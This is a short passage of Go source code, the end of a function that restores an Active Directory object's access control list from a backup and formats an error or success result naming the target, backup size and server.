		return structs.CommandResult{
			Output: fmt.Sprintf("Error restoring DACL: %v", err), Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] DACL Restored\n"+
			"[+] Target: %s\n"+
			"[+] Restored from backup (%d bytes)\n"+
			"[+] Server: %s\n", targetDN, len(sd), args.Server),
		Status: "success", Completed: true,
	}
}
